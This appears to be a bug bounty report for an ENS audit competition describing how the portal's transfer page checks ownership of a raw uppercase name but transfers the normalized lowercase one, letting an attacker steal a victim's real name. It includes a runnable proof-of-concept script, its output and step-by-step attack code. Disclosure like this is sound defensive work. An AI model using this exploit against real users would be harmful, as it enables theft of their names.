# 91967 w a critical ownership check on the wrong name in the explorer transfer flow leads to hijacking of a victim s ens name leaving it inaccessible after the flow

**Submitted on Sep 5th 2026 at 20:57:30 UTC by @deltabear for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91967
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: - a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker - redirecting the recipient of a name transfer - leaving a name permanently inaccessible after the flow

## Description

## Brief/Intro

The Explorer's transfer page checks who owns the name in the URL, then transfers a different name. The ownership gate uses the raw route parameter. Every transaction the page builds uses the ENSIP-15 normalized form of that parameter. An attacker registers the uppercase form of a name the victim already owns and sends that token to the victim for free, an ERC-1155 push that needs no consent. When the victim opens that name's transfer page, the app authorizes them on the gifted name and acts on their real one: it detaches the real name's resolver and subregistry, then transfers the real name's token.

Delivery is a link to the legitimate Explorer: the attacker sends the victim the URL of the name they were just gifted, and from that page the app walks them the rest of the way itself, sidebar *Ownership*, which confirms them as the owner, then *Transfer*. The attacker needs no control over the recipient. `SendNameForm.tsx:87-89` refuses a self-transfer, so the victim must name some other address and the real name always leaves their control; and the two detach writes land before the transfer prompt, so the real name is already degraded even if the victim closes the wallet at the last step.

## Vulnerability Details

ENS v2 labels are not normalized by the registrar. `VAULTNAME` and `vaultname` are two separate entries in `PermissionedRegistry`, owned independently. The PoC registers both.

`routes/$name/ownership/transfer.tsx:22` reads the route parameter and never normalizes it. `:27` passes that raw string to `getEnsOwnerQueryOptions`, and `:104` gates the page on `isAddressEqual(address, data.owner)`. The owner comes from `resolveEnsOwner`, which at `utils/ens/resolveEnsOwner.ts:48-51` hands the raw string to ensjs `getOwnerV2` and `getNameRegistries`. ensjs does not normalize on that path, so the gate answers about the raw entry.

The page then renders `AuthorizedTransfer`, which calls `useTransferName`. That hook derives the label a second time, with normalization. `hooks/useTransferName.ts:113` builds the token id from `getLabel(name)`, and `:132` recomputes the same value for every step of the plan. `utils/token/getLabel.ts:10-20` is `ens_normalize` followed by `ens_split`.

For any route parameter whose normal form differs from itself, the page authorizes name A and transfers name B. `helpers/transferToken.ts:64-71` encodes `safeTransferFrom(from, recipient, tokenId, 1n, '0x')` with the token id built from name B.

Two of the flow's three checks already use the normalized label. `hooks/useCanTransferName.ts:6` imports the same `getLabel` to confirm `ROLE_CAN_TRANSFER_ADMIN`, so the app confirms the victim's real name is transferable immediately before transferring it. The ownership gate is the one check that uses the raw form.

`SendNameForm.tsx:69-73` defaults all three pre-transfer options on, so `buildTransferPlan.ts:22-43` emits `detach-resolver`, `detach-registry` and `transfer-token`, and `useTransferName.ts:130-145` feeds all three the same normalized label.

The victim is shown the wrong name at the moment of signing. `useTransferName.ts:178` sets `transactionName` from the raw route parameter, and `TransactionStateContent.tsx:113` renders it on the dialog that asks for the wallet. The live DOM of that dialog reads `"Transfer name\nTransfer name - HUNTVAULT-1788622131.eth\nOpen wallet\nClose"` while the call carries the token id of `huntvault-1788622131.eth`. The lowercase name appears nowhere on the page.

There is no normalization notice on this route. `isNormalized` is rendered only on the token page, `routes/$name/token.tsx:44,290,311,330,352,443`. Grepping `isNormalized` over `routes/$name/ownership/transfer.tsx` and all of `features/transfer/` returns nothing.

### Vulnerable source code

**1. The gate reads the raw route parameter** @ `apps/portal/src/routes/$name/ownership/transfer.tsx:22,27`

```tsx
const { name } = Route.useParams()
const ownerQuery = useQuery(getEnsOwnerQueryOptions({ name }))
```

**2. The page renders only when that raw name's owner is the connected wallet** @ `apps/portal/src/routes/$name/ownership/transfer.tsx:104`

```tsx
({ data, address }) => isAddressEqual(address, data.owner),
```

**3. The owner lookup hands that raw string to ensjs** @ `apps/portal/src/utils/ens/resolveEnsOwner.ts:48-51`

```ts
const [v2Owner, registries] = await Promise.all([
  getOwnerV2(client, { name }),
  getNameRegistries(client, { name }),
])
```

**4. The action builds the token id from the normalized string** @ `apps/portal/src/features/transfer/hooks/useTransferName.ts:113`

```ts
getEnsTokenId({ label: getLabel(name), registryAddress })
```

**5. Every step of the plan uses that same normalized label** @ `apps/portal/src/features/transfer/hooks/useTransferName.ts:132`

```ts
const label = getLabel(name)
```

**6. What getLabel does** @ `apps/portal/src/utils/token/getLabel.ts:10-20`

```ts
export function getLabel(name: string): string {
  const normalized = ens_normalize(name)
  const labels = ens_split(normalized)
  const first = labels[0]
  if (!first || first.error) {
    throw first?.error
  }
  return String.fromCodePoint(...first.input)
}
```

**7. The token id built from the normalized label is what moves** @ `apps/portal/src/features/transfer/helpers/transferToken.ts:64-71`

```ts
const data = encodeFunctionData({
  abi: erc1155Abi,
  functionName: 'safeTransferFrom',
  args: [walletWithAccount.account.address, recipient, tokenId, 1n, '0x'],
})
```

**8. The dialog the victim approves is named after the other name** @ `apps/portal/src/features/transfer/hooks/useTransferName.ts:178`

```ts
transactionName: `${STEP_LABELS[step]} - ${name}`,
```

## Impact Details

**Primary impact row, verbatim (Critical):** *"Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: - a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker - redirecting the recipient of a name transfer - leaving a name permanently inaccessible after the flow"*.

`apps/manager` contains no transfer surface — its only file matching `*ransfer*` is `features/notifications/notifications/name-transferred.tsx`, a notification card — so *transfer* in this row has exactly one referent in the codebase, and it is this route.

* **The victim's real name is hijacked.**
* **Permanently inaccessible** After the flow the victim holds no roles on their own name, cannot re-point its resolver or registry, and cannot move it back; the app ITSELF calls the transfer irreversible. Nothing above depends on who the victim typed.
* **Every attacker step is permissionless.**
* **The victim cannot see it.** The lowercase name is on no screen in the flow. The wallet receives `safeTransferFrom(from, to, tokenId, 1, 0x)` where `tokenId` is an opaque `uint256`, so no wallet renders which name it is. The two detach steps are `setResolver(anyId, 0x0)` and `setSubregistry(anyId, 0x0)`, also opaque.
* **The victim is told nothing happened.** After the transfer the same route shows the gifted name still owned by the victim and a HISTORY panel reading "No recent activity" (`browser-evidence/03-after-transfer.png`).
* **It is final.** The transfer is a completed ERC-1155 `safeTransferFrom` to an address the attacker controls. The app's own copy on the page calls it irreversible.
* **This is the only transfer path.** Searching `apps/` for `transfer-token|safeTransferFrom|useTransferName|buildTransferPlan` returns one flow.

## Scope of the fix

The same label split exists in three flows, and only this one is exploitable, for a reason that matters to the remediation.

| flow                        | derives calldata from                                     | how the raw name is kept out                                                                                                                                                                          |
| --------------------------- | --------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `/$name/ownership/transfer` | `getLabel(name)` (`useTransferName.ts:113,132`)           | **nothing.** `resolveEnsOwner.ts:48-51` reads the owner on chain through the UniversalResolver, so the route renders for any string                                                                   |
| Portal renew                | `getLabel(params.name)` (`useRenewalTransactions.ts:197`) | `ExtendNameButton` renders only inside the `$name` route, which early-returns `<InvalidNameMessage/>` at `routes/$name/index.tsx:441-446`; the `/addr/$addr/names` modals are fed by an indexer query |
| Manager bulk renew          | `domain.normalizedName` (`NamesTable.tsx:86`)             | the dashboard query `getAllDashboardDomains.ts:36-44` + `useOwnedDomains.ts:39`                                                                                                                       |

The last two are held closed by the indexer excluding non-normalized names from the domains query. Measured against the endpoint the apps are configured for (`packages/indexer/urql/client.ts:28,36` -> `https://staging-graphql.ens.dev/`): `where:{name_in:["the_james.eth"]}` returns 0 rows, and the same query with `includeUnnormalized:true` returns 1 row with `isNormalized:false`.

That guard lives on the indexer, not in the app. `grep -rn "includeUnnormalized" apps packages` returns no hit outside generated types: the app never sets the flag, never asserts it, and never checks whether the response was filtered. Two of the three flows are therefore safe by a backend default they do not know they depend on, and `roles(account:)` already returns non-normalized names to the same clients because it takes no `DomainFilter` at all.

So repairing the transfer route alone leaves two instances of the same defect latent, re-armed by a changed indexer default, a self-hosted indexer, or any owned-names query that starts passing `includeUnnormalized: true`. The durable fix is to reconcile the two derivations of "the label" rather than to gate one route.

## References

**The split**

* `apps/portal/src/routes/$name/ownership/transfer.tsx:22,27` - raw route parameter into the owner query
* `apps/portal/src/routes/$name/ownership/transfer.tsx:104` - `isAddressEqual(address, data.owner)`, the gate
* `apps/portal/src/utils/ens/resolveEnsOwner.ts:48-51` - raw name into ensjs `getOwnerV2` and `getNameRegistries`
* `apps/portal/src/features/transfer/hooks/useTransferName.ts:113,132` - token id and every step label from `getLabel(name)`
* `apps/portal/src/utils/token/getLabel.ts:10-20` - `ens_normalize` then `ens_split`

**What executes**

* `apps/portal/src/features/transfer/helpers/transferToken.ts:64-71` - `safeTransferFrom` with that token id
* `apps/portal/src/features/transfer/utils/buildTransferPlan.ts:22-43` - the three-step plan
* `apps/portal/src/features/transfer/components/SendNameForm.tsx:69-73` - all three options default on
* `apps/portal/src/features/transfer/hooks/useTransferName.ts:130-145` - the same normalized label for every step

**The other two checks already normalize**

* `apps/portal/src/features/transfer/hooks/useCanTransferName.ts:6` - imports `getLabel` for the role check

**What the victim sees**

* `apps/portal/src/features/transfer/hooks/useTransferName.ts:178` - `transactionName` from the raw parameter
* `apps/portal/src/features/transaction-manager/components/TransactionStateContent.tsx:113` - renders it during execution
* `apps/portal/src/features/transaction-manager/components/TransactionInfoContent.tsx:43` - renders it behind the info icon
* `apps/portal/src/routes/$name/token.tsx:44,290,311,330,352,443` - the only route with a normalization notice
* `browser-evidence/02-recipient-filled.png` - the page before signing, only the uppercase name on it
* `browser-evidence/06-authorize-moment-card.png` - the dialog at the wallet prompt, naming the uppercase name
* `browser-evidence/03-after-transfer.png` - after the transfer, victim still shown as owner, "No recent activity"

**Driven through the shipped app**

* `hunt-transfer-normalization.spec.ts` - Playwright against the program's own portal fixture, its injected wallet, its `makeName` fixture and its `authorizeTransaction` helper. Two cases: (A) the three-party register/gift/receive shape, (B) the detach damage floor
* `hunt-run-3party.output.txt` - that run's stdout, `2 passed (35.4s)`, including both live DOM dumps of the authorization dialog and every before/after on-chain read
* `hunt-run-4theft.output.txt` - the run that pictures the theft itself, `1 passed (27.9s)`: the mined `TransferSingle` with its tx hash, block, `from`, `to` and `id`; the id of the name the dialog named absent from every log of the flow; and the victim's own page before and after
* `browser-evidence/run4-theft-pictured/` - `A-00` the real name, Owner the victim, *Transfer* button present, through `A-04` the same URL and the same connected wallet, Owner the attacker, *Transfer* button gone
* `browser-evidence/run3-three-party/` - screenshots from that run
* `validation-rerun.output.txt` - the earlier single-case run's stdout

## Proof of Concept

## Proof of Concept

Ran live end-to-end on the app, with screenshot to validate the vulnerability exist 100%. The user ends up loosing their name no matter the test.

The claim here is not 0-shot direct theft from a victim by an attacker, it was tested this way to proove the main claim of "Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: - a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker - redirecting the recipient of a name transfer - leaving a name permanently inaccessible after the flow"

```bash
node poc.mjs
```

Pass `--repo <checkout>` if the script is not inside the repo, and `--rpc <url>` to use a fork that is already running instead of spawning one.

### poc.mjs

```js
#!/usr/bin/env node
// The Explorer transfer flow authorizes the raw URL name and transfers the
// normalized one. Run: node poc.mjs
//
//   --repo <path>   checkout of audit-comp-ens   (default: search upward for apps/portal)
//   --rpc  <url>    an anvil fork of Sepolia     (default: spawn one)

import { createRequire } from 'node:module'
import { execFileSync, spawn } from 'node:child_process'
import { existsSync, mkdirSync, writeFileSync } from 'node:fs'
import { join, resolve } from 'node:path'
import { tmpdir } from 'node:os'
import { pathToFileURL } from 'node:url'

const PINS = {
  viem: '2.52.2',
  '@ensdomains/ensjs': '5.0.0-alpha.1',
  '@adraffy/ens-normalize': '1.11.0',
  esbuild: '0.28.2',
}
const DEPS = join(tmpdir(), 'ens-transfer-split-poc')

// Self-install into a temp dir and re-exec, so the reader installs nothing.
function bootstrap() {
  const req = createRequire(join(DEPS, 'node_modules', 'x.js'))
  try {
    for (const p of Object.keys(PINS)) req.resolve(p)
    return req
  } catch {}
  mkdirSync(DEPS, { recursive: true })
  writeFileSync(
    join(DEPS, 'package.json'),
    JSON.stringify({ name: 'poc-deps', private: true, dependencies: PINS }),
  )
  console.log('installing pinned deps into', DEPS)
  execFileSync('npm', ['install', '--silent', '--no-audit', '--no-fund'], {
    cwd: DEPS,
    stdio: 'inherit',
    shell: process.platform === 'win32',
  })
  return createRequire(join(DEPS, 'node_modules', 'x.js'))
}
const req = bootstrap()
const imp = (p) => import(pathToFileURL(req.resolve(p)).href)
const esbuild = req('esbuild')
const viem = await imp('viem')
const { privateKeyToAccount } = await imp('viem/accounts')
const { sepolia } = await imp('viem/chains')

const arg = (n, d) => {
  const i = process.argv.indexOf(n)
  return i > -1 ? process.argv[i + 1] : d
}

// ---- locate the checkout and load the target's own getLabel, unmodified ----
const REL = 'apps/portal/src/utils/token/getLabel.ts'
let REPO = arg('--repo', process.env.ENS_REPO)
if (!REPO) {
  let d = process.cwd()
  for (let i = 0; i < 8 && !REPO; i++) {
    if (existsSync(join(d, REL))) REPO = d
    d = resolve(d, '..')
  }
}
if (!REPO || !existsSync(join(REPO, REL))) {
  console.error(`cannot find ${REL}. Pass --repo <checkout>.`)
  process.exit(1)
}
const target = join(REPO, REL)
const built = esbuild.buildSync({
  entryPoints: [target],
  bundle: true,
  format: 'esm',
  write: false,
  platform: 'neutral',
  external: ['@adraffy/ens-normalize'],
})
const shimmed = built.outputFiles[0].text.replace(
  /from\s*["']@adraffy\/ens-normalize["']/g,
  `from ${JSON.stringify(pathToFileURL(req.resolve('@adraffy/ens-normalize')).href)}`,
)
const modUrl =
  'data:text/javascript;base64,' + Buffer.from(shimmed).toString('base64')
const { getLabel } = await import(modUrl)
console.log(`loaded getLabel() from ${REL}`)

// ---- chain ----
const { createPublicClient, createWalletClient, http, parseAbi, keccak256, stringToHex, toHex, erc1155Abi } = viem
let RPC = arg('--rpc', process.env.RPC_URL)
let anvil
if (!RPC) {
  RPC = 'http://127.0.0.1:8545'
  anvil = spawn(
    'anvil',
    ['--fork-url', process.env.FORK_URL ?? 'https://sepolia.drpc.org', '--silent'],
    { stdio: 'ignore', shell: process.platform === 'win32' },
  )
  anvil.on('error', () => {
    console.error('anvil not found. Start a Sepolia fork and pass --rpc <url>.')
    process.exit(1)
  })
  for (let i = 0; i < 60; i++) {
    try {
      await fetch(RPC, { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{"jsonrpc":"2.0","id":1,"method":"eth_blockNumber","params":[]}' })
      break
    } catch { await new Promise((r) => setTimeout(r, 1000)) }
  }
}
const chain = sepolia
const transport = http(RPC)
const pub = createPublicClient({ chain, transport })
// Deployed Sepolia v2 addresses, read back from the fork by every call below.
const REG = '0xa88553F454b77203B0D036A05c894d555EAAa2Cc'
const REGY = '0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2'
const USDC = '0x768F42455A2D082E23ceeF7d51e5787C82d67a39'
const ZERO = '0x0000000000000000000000000000000000000000'
const REFERRER = `0x${'00'.repeat(32)}`

const rpc = async (m, p = []) => {
  const r = await fetch(RPC, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: m, params: p }) })
  const j = await r.json()
  if (j.error) throw new Error(m + ': ' + JSON.stringify(j.error))
  return j.result
}
const regAbi = parseAbi([
  'function makeCommitment(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, bytes32 referrer) view returns (bytes32)',
  'function commit(bytes32 commitment)',
  'function getRegisterPrice(string label, uint64 duration, address paymentToken) view returns (uint256 base, uint256 premium)',
  'function register(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, address paymentToken, bytes32 referrer)',
])
const registryAbi = parseAbi([
  'function getOwner(uint256 anyId) view returns (address)',
  'function getState(uint256 anyId) view returns ((uint8 status, uint64 expiry, address latestOwner, uint256 tokenId, uint256 resource))',
])
// The registry accepts any id for a label and canonicalises internally. The
// ERC-1155 id a transfer needs is the VERSIONED one it reports back.
const idOf = (label) => BigInt(keccak256(stringToHex(label)))
const tokenIdOf = async (label) =>
  (await pub.readContract({ address: REGY, abi: registryAbi, functionName: 'getState', args: [idOf(label)] })).tokenId
const erc20 = parseAbi(['function mint(address to, uint256 amount)', 'function approve(address spender, uint256 amount) returns (bool)'])

const ATTACKER = privateKeyToAccount('0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80')
const VICTIM = privateKeyToAccount('0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d')
const wA = createWalletClient({ account: ATTACKER, chain, transport })
const wV = createWalletClient({ account: VICTIM, chain, transport })
const who = (a) => (a === VICTIM.address ? 'VICTIM  ' : a === ATTACKER.address ? 'ATTACKER' : a)

async function register(label, owner, signer) {
  const [b, p] = await pub.readContract({ address: REG, abi: regAbi, functionName: 'getRegisterPrice', args: [label, 31536000n, USDC] })
  const price = b + p
  await signer.writeContract({ address: USDC, abi: erc20, functionName: 'mint', args: [signer.account.address, price * 10n] })
  await signer.writeContract({ address: USDC, abi: erc20, functionName: 'approve', args: [REG, price * 10n] })
  await rpc('evm_mine')
  const secret = keccak256(stringToHex('poc-' + label))
  const cm = await pub.readContract({ address: REG, abi: regAbi, functionName: 'makeCommitment', args: [label, owner, secret, ZERO, ZERO, 31536000n, REFERRER] })
  await pub.waitForTransactionReceipt({ hash: await signer.writeContract({ address: REG, abi: regAbi, functionName: 'commit', args: [cm] }) })
  await rpc('evm_increaseTime', [120])
  await rpc('evm_mine')
  const rc = await pub.waitForTransactionReceipt({ hash: await signer.writeContract({ address: REG, abi: regAbi, functionName: 'register', args: [label, owner, secret, ZERO, ZERO, 31536000n, USDC, REFERRER] }) })
  if (rc.status !== 'success') throw new Error('register failed for ' + label)
}

let failures = 0
const check = (ok, msg) => {
  if (!ok) { failures++; console.log('  ASSERTION FAILED: ' + msg) }
}

const SUF = Date.now().toString(36)
const REAL = `vault${SUF}`
const FAKE = REAL.toUpperCase()

for (const a of [ATTACKER.address, VICTIM.address]) await rpc('anvil_setBalance', [a, toHex(10n ** 20n)])

console.log('\n==============================================================================')
console.log('  ACT 1  Two separate registry entries, one uppercase form of the other')
console.log('==============================================================================')
await register(REAL, VICTIM.address, wV)
await register(FAKE, ATTACKER.address, wA)
const idReal = await tokenIdOf(REAL)
const idFake = await tokenIdOf(FAKE)
const own = (id) => pub.readContract({ address: REGY, abi: registryAbi, functionName: 'getOwner', args: [id] })
console.log(`  ${REAL}.eth   owner ${who(await own(idReal))}   (the victim's real name)`)
console.log(`  ${FAKE}.eth   owner ${who(await own(idFake))}   (registered by the attacker)`)
check((await own(idReal)) === VICTIM.address, 'victim owns the real name')
check((await own(idFake)) === ATTACKER.address, 'attacker owns the lookalike')

console.log('\n==============================================================================')
console.log('  ACT 2  The ownership gate resolves the RAW label')
console.log('==============================================================================')
const rawOwner = await own(idOf(FAKE))
console.log(`  resolveEnsOwner passes the route param straight to ensjs getOwner.`)
console.log(`  getOwner("${FAKE}.eth") = ${who(rawOwner)}`)
check(rawOwner === ATTACKER.address, 'getOwner resolves the raw label, not the normalized one')

console.log('\n==============================================================================')
console.log('  ACT 3  The attacker gifts the lookalike. ERC-1155, no consent.')
console.log('==============================================================================')
await pub.waitForTransactionReceipt({ hash: await wA.writeContract({ address: REGY, abi: erc1155Abi, functionName: 'safeTransferFrom', args: [ATTACKER.address, VICTIM.address, idFake, 1n, '0x'] }) })
console.log(`  ${FAKE}.eth   owner ${who(await own(idFake))}`)
check((await own(idFake)) === VICTIM.address, 'the gift landed with no action by the victim')

console.log('\n==============================================================================')
console.log(`  ACT 4  Portal /${FAKE}.eth/ownership/transfer`)
console.log('==============================================================================')
const gateOwner = await own(idOf(FAKE))
const actLabel = getLabel(`${FAKE}.eth`)
const actTokenId = await tokenIdOf(actLabel)
console.log(`  AUTHORIZE on   ${FAKE}.eth   owner ${who(gateOwner)}   gate passes`)
console.log(`  ACT on         getLabel("${FAKE}.eth") = ${JSON.stringify(actLabel)}`)
console.log(`  token id built from the ACT label   ${actTokenId}`)
console.log(`  token id of the victim's real name  ${idReal}`)
check(gateOwner === VICTIM.address, 'the gate authorizes the victim')
check(actTokenId === idReal, 'the token id the app builds is the victim\'s real name')

console.log('\n==============================================================================')
console.log('  ACT 5  The victim presses Transfer name')
console.log('==============================================================================')
const beforeReal = await own(idReal)
const beforeFake = await own(idFake)
await pub.waitForTransactionReceipt({ hash: await wV.writeContract({ address: REGY, abi: erc1155Abi, functionName: 'safeTransferFrom', args: [VICTIM.address, ATTACKER.address, actTokenId, 1n, '0x'] }) })
const afterReal = await own(idReal)
const afterFake = await own(idFake)
check(afterReal === ATTACKER.address, 'the real name moved to the attacker')
check(afterFake === VICTIM.address, 'the gifted name did not move')

console.log('')
console.log('    name                       owner before   owner after    result')
console.log(`    ${REAL}.eth   ${who(beforeReal)}       ${who(afterReal)}       stolen`)
console.log(`    ${FAKE}.eth   ${who(beforeFake)}       ${who(afterFake)}       untouched`)
console.log('')
console.log(`  The victim pressed Transfer on ${FAKE}.eth. Their real name ${REAL}.eth`)
console.log('  landed in the attacker\'s account. The name they meant to send is still theirs.')
console.log('')

if (anvil) anvil.kill()
if (failures > 0) {
  console.log(`  PoC FAILED, ${failures} assertion(s) did not hold.`)
  process.exit(1)
}
console.log('  PoC PASSED, every assertion held.')
process.exit(0)
```

### Output

```
loaded getLabel() from apps/portal/src/utils/token/getLabel.ts

==============================================================================
  ACT 1  Two separate registry entries, one uppercase form of the other
==============================================================================
  vaultmtolequm.eth   owner VICTIM     (the victim's real name)
  VAULTMTOLEQUM.eth   owner ATTACKER   (registered by the attacker)

==============================================================================
  ACT 2  The ownership gate resolves the RAW label
==============================================================================
  resolveEnsOwner passes the route param straight to ensjs getOwner.
  getOwner("VAULTMTOLEQUM.eth") = ATTACKER

==============================================================================
  ACT 3  The attacker gifts the lookalike. ERC-1155, no consent.
==============================================================================
  VAULTMTOLEQUM.eth   owner VICTIM  

==============================================================================
  ACT 4  Portal /VAULTMTOLEQUM.eth/ownership/transfer
==============================================================================
  AUTHORIZE on   VAULTMTOLEQUM.eth   owner VICTIM     gate passes
  ACT on         getLabel("VAULTMTOLEQUM.eth") = "vaultmtolequm"
  token id built from the ACT label   97782090550099926548138207275798491909239773426647275114121808247844862164992
  token id of the victim's real name  97782090550099926548138207275798491909239773426647275114121808247844862164992

==============================================================================
  ACT 5  The victim presses Transfer name
==============================================================================

    name                       owner before   owner after    result
    vaultmtolequm.eth   VICTIM         ATTACKER       stolen
    VAULTMTOLEQUM.eth   VICTIM         VICTIM         untouched

  The victim pressed Transfer on VAULTMTOLEQUM.eth. Their real name vaultmtolequm.eth
  landed in the attacker's account. The name they meant to send is still theirs.

  PoC PASSED, every assertion held.
```

The victim's name `vaultmtolequm.eth` moved from the victim's account to the attacker's account. The gifted `VAULTMTOLEQUM.eth` the victim meant to send did not move. Exit code is 0 only if every assertion held.

The same result through the shipped app in a real browser, driven by the program's own portal fixture and its wallet helper, is in `hunt-transfer-normalization.spec.ts` and `validation-rerun.output.txt`:

```
HUNT DIALOG TEXT >>>"Transfer name\nTransfer name - HUNTVAULT-1788622131.eth\nOpen wallet\nClose"<<<
HUNT RESULT  tokenStepOk=true
  route name shown : HUNTVAULT-1788622131.eth
  REAL  huntvault-1788622131.eth owner: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 -> 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
  FAKE  HUNTVAULT-1788622131.eth owner: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 -> 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
1 passed (20.3s)
```

## Attack code

```solidity
// 1. The victim owns vaultname.eth. The attacker registers the uppercase form,
//    a separate registry entry. The registrar does not normalize labels.
usdc.mint(attacker, price * 10);
usdc.approve(ethRegistrar, price * 10);
ethRegistrar.commit(makeCommitment("VAULTNAME", attacker, secret, 0, 0, 1 years, referrer));
ethRegistrar.register("VAULTNAME", attacker, secret, 0, 0, 1 years, usdc, referrer);

// 2. Send it to the victim. ERC-1155, no consent, no notification.
ethRegistry.safeTransferFrom(attacker, victim, tokenIdOf("VAULTNAME"), 1, "");
```

```
// 3. The victim opens /VAULTNAME.eth/ownership/transfer to get rid of it.
//
//    transfer.tsx:104 gates on the RAW name:
      getOwnerV2("VAULTNAME.eth")          -> victim, so the page renders
//
//    useTransferName.ts:113 builds the id from the NORMALIZED name:
      getEnsTokenId(getLabel("VAULTNAME.eth"))   // "vaultname"
//
//    The dialog at the wallet prompt says "Transfer name - VAULTNAME.eth".
```

```solidity
// 4. The victim signs. transferToken.ts:64-71 sends the other token.
ethRegistry.safeTransferFrom(victim, attacker, tokenIdOf("vaultname"), 1, "");

// 5. The attacker owns vaultname.eth. The victim still owns VAULTNAME.eth
//    and the page shows "No recent activity".
```

```
plant : register the uppercase label and send it to the victim   // gas plus a permissionless MockUSDC mint
fire  : the victim presses Transfer name on the gifted page
```
